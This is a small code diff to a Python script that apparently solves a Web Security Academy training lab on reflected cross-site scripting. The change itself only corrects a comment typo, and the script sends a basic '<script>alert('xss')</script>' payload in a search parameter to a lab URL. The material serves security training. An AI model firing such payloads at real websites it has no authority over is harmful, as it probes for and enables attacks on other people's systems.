@@ -10,7 +10,7 @@ import requests
 
 
 lab_id = '0a730009046f3b8080e262c600ea006a' #change based on generated lab
-payload = "<script>alert('xss')</script>" # search paramter is vulnerable to reflected XSS
+payload = "<script>alert('xss')</script>" # search parameter is vulnerable to reflected XSS
 uri = f"https://{lab_id}.web-security-academy.net/?search={payload}" 
 
 r = requests.get(uri)
